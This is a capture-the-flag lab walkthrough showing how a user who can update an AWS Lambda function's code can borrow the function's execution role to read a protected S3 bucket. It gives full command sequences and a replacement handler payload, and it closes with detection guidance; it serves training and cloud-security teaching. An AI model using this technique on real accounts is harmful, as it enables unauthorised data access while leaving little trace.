# Solution: Lambda Function Code Update to Bucket

This scenario demonstrates a privilege escalation vector that is easy to overlook because it does not involve any direct IAM policy manipulation. The attack hinges on a simple equivalence: if you can change the code a Lambda function runs, you effectively inherit every permission that function's execution role holds — including access to sensitive S3 buckets.

The vulnerability appears whenever `lambda:UpdateFunctionCode` is granted to a principal that is not a tightly scoped CI/CD deployment role. In real environments this often surfaces as a developer IAM user with deployment access, a service account with overly broad Lambda permissions, or a legacy policy that was written before the sensitivity of code-update permissions was fully understood. The Lambda function itself is not the target — it is the bridge. The target is whatever the execution role can reach, and in this scenario that is a bucket containing a CTF flag.

Unlike attacks that require creating new infrastructure (new roles, new functions, new policies), this technique exploits something that already exists and is probably already trusted by the workload. That makes it quieter: no new resources appear in the account, no new policies are attached, and the function continues to respond normally after cleanup restores the original code.

## The Challenge

You start with credentials for `pl-prod-lambda-003-to-bucket-starting-user`. This IAM user has two meaningful permissions, both scoped to a single Lambda function: `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on `pl-prod-lambda-003-to-bucket-target-lambda`. That is the entire attack surface you have been given.

The target is `pl-prod-lambda-003-to-bucket-{account_id}`, an S3 bucket with a `flag.txt` object inside it. Your starting user has no S3 permissions — no `s3:GetObject`, no `s3:ListBucket`, nothing. But the Lambda function's execution role, `pl-prod-lambda-003-to-bucket-target-role`, does. It has exactly the S3 access needed to read from the target bucket. Your starting user cannot reach the bucket directly, but it can control what code the function runs — and by extension, what the function does with its privileged identity.

## Reconnaissance

Start by confirming your identity and verifying that your starting user has no direct S3 access:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"

aws sts get-caller-identity
```

You should see the ARN for `pl-prod-lambda-003-to-bucket-starting-user`. Now confirm the wall between you and the target data:

```bash
aws s3 ls
# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Good. Now use your helpful permissions to understand the target function. If you have `lambda:ListFunctions`, enumerate available functions:

```bash
aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table
```

You will see `pl-prod-lambda-003-to-bucket-target-lambda` alongside its execution role ARN. Pull the full function configuration to get the handler name — you will need this shortly:

```bash
aws lambda get-function-configuration \
  --function-name pl-prod-lambda-003-to-bucket-target-lambda \
  --query '[Handler, Role]' \
  --output table
```

The `Handler` field will be something like `lambda_function.lambda_handler`. The module name before the dot (`lambda_function`) must match the filename of whatever Python code you put in the deployment zip. If you get this wrong, Lambda will throw a handler-not-found error when you invoke and nothing will execute.

If you have `iam:GetRole`, confirm the execution role's permissions:

```bash
aws iam get-role \
  --role-name pl-prod-lambda-003-to-bucket-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

You can also check the attached policies to verify the S3 access:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-lambda-003-to-bucket-target-role
```

The role's policy grants `s3:GetObject` and `s3:ListBucket` on the target bucket. That is the access you are about to borrow.

## Exploitation

The plan is three steps: fetch the existing code to avoid losing the original handler, append a payload that reads `flag.txt` and returns it in the response, deploy the modified code, and invoke the function.

### Step 1: Download the original code

Use `lambda:GetFunction` to get a pre-signed S3 URL pointing to the current deployment package, then download it as a backup:

```bash
ORIGINAL_CODE_URL=$(aws lambda get-function \
  --function-name pl-prod-lambda-003-to-bucket-target-lambda \
  --query 'Code.Location' \
  --output text)

curl -s -o /tmp/lambda-003-to-bucket-original.zip "$ORIGINAL_CODE_URL"
```

This backup is important: it lets the cleanup script restore the function to its original state after the demo.

### Step 2: Write the malicious payload

Create the handler file. The filename **must** be `lambda_function.py` to match the `lambda_function.lambda_handler` handler. Your starting user has no S3 permissions, so the bucket name comes from the platform, not the API -- take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`) next to your terminal before writing the handler. The bucket name is baked into the handler at write time: the heredoc's `EOF` is deliberately unquoted, so the shell expands your `TARGET_BUCKET` value into the code before it is zipped. That keeps the invocation payload empty — the player terminal's AWS CLI v2 rejects a raw JSON `--payload`, so the bucket travels inside the function instead of the event:

```bash
TARGET_BUCKET=<paste the target_bucket_name output here>

cat > /tmp/lambda_function.py << EOF
import boto3
import json
import os

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
    response = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = response['Body'].read().decode('utf-8')
    return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
EOF
```

This function reads `flag.txt` from the bucket baked into it at write time — the function's pre-set `TARGET_BUCKET` environment variable takes precedence when present — and returns the contents in the JSON response body. It uses the execution role's identity implicitly — when Lambda runs this code, it injects credentials for `pl-prod-lambda-003-to-bucket-target-role` automatically, so the `boto3.client('s3')` call inherits that role's S3 permissions without any explicit credential configuration.

### Step 3: Package and deploy

```bash
cd /tmp && zip lambda-003-to-bucket-payload.zip lambda_function.py

aws lambda update-function-code \
  --function-name pl-prod-lambda-003-to-bucket-target-lambda \
  --zip-file fileb:///tmp/lambda-003-to-bucket-payload.zip
```

Wait for the update to complete. Lambda processes code updates asynchronously — deploying returns quickly, but the function is not yet updated. Poll until `LastUpdateStatus` shows `Successful`:

```bash
aws lambda get-function-configuration \
  --function-name pl-prod-lambda-003-to-bucket-target-lambda \
  --query 'LastUpdateStatus' \
  --output text
```

### Step 4: Invoke the function

The handler already knows where to look for `flag.txt` — your `TARGET_BUCKET` was baked into it in Step 2 — so the invocation payload is empty:

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-003-to-bucket-target-lambda \
  --payload '{}' \
  /tmp/lambda-003-response.json

cat /tmp/lambda-003-response.json
```

The function executes under `pl-prod-lambda-003-to-bucket-target-role`, reads `flag.txt` from the bucket, and returns the content in the response. The response will look like:

```json
{"statusCode": 200, "body": "{\"flag\": \"flag{...}\"}"}
```

## Verification

Extract the flag value from the nested JSON:

```bash
cat /tmp/lambda-003-response.json | \
  python3 -c "import sys,json; body=json.load(sys.stdin); print(json.loads(body['body'])['flag'])"
```

If the function returned a `FunctionError` field in addition to `StatusCode: 200`, check for errors — common causes are a bucket name typo, a handler mismatch, or the update not yet reaching `Successful` state.

## Capture the Flag

The flag is stored as `flag.txt` in the target S3 bucket. You retrieved it in the previous step via the Lambda response body — the flag value printed by the extraction command above is your submission.

To retrieve it directly from S3 (confirming the end-to-end bucket access), note that the flag is accessible through the Lambda execution role path you just established. The starting user still cannot reach the bucket directly:

```bash
aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
# AccessDenied -- the starting user still has no direct S3 permissions
```

The flag was obtained through the function's identity, not yours. This distinction matters: you escalated your effective access without ever acquiring a credential that grants S3 permissions. The starting user's IAM policy is unchanged — only the Lambda function's code was modified.

## What Happened

You exploited the same implicit equivalence as the to-admin variant of this technique, but aimed at data access rather than full administrative control. The Lambda execution role held `s3:GetObject` on a sensitive bucket. Your starting user held `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on the function. By injecting a payload that used the execution role's S3 permissions, you ferried the flag out through the function's invocation response — without touching IAM policies, without creating new resources, and without any S3 credentials of your own.

In real-world environments this attack path is significant precisely because of its low footprint. A CSPM tool that only flags direct S3 access misconfiguration would miss it entirely — the bucket policy may be perfectly locked down while the Lambda update permission quietly provides an indirect route to the same data. Detection requires reasoning across service boundaries: understanding that `lambda:UpdateFunctionCode` on a function whose execution role reads a sensitive bucket is functionally equivalent to having `s3:GetObject` on that bucket directly.
